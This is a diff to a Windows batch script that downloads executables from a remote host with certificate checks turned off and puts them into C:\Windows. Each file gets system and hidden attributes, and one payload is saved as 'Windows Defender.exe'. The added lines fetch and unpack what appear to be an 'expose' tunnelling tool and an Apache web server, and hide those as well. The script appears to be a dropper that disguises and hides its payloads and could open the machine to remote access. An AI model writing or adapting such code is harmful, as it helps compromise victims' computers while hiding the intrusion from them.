@@ -3,3 +3,17 @@ attrib -s -h i "C:\Windows\nircmd.exe" && curl.exe -k %proxy% %host%/Capture/nir
 attrib -s -h i "C:\Windows\curl.exe" && curl.exe -k %proxy% %host%/Tools/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "C:\Windows\curl.exe"
 
 attrib -s -h i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
+
+attrib -s -h -i "C:\Windows\expose.exe" 
+if exist "C:\Windows\expose.exe" (
+    attrib +s +h +i "C:\Windows\expose.exe"
+) else (
+    curl.exe -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "C:\Windows\7-Zip\7z.exe" x "%temp%\expose.zip" -o"C:\Windows" -y && attrib +s +h +i "C:\Windows\expose.exe" && del "%temp%\expose.zip"
+)
+ 
+ attrib -s -h -i "C:\Windows\apache2"
+if exist "C:\Windows\apache2\bin\httpd.exe" (
+    echo.
+) else (
+    curl.exe -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "C:\Windows\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"C:\Windows" -y && attrib +s +h +i "C:\Windows\apache2" && del "%temp%\apache2.zip"
+)
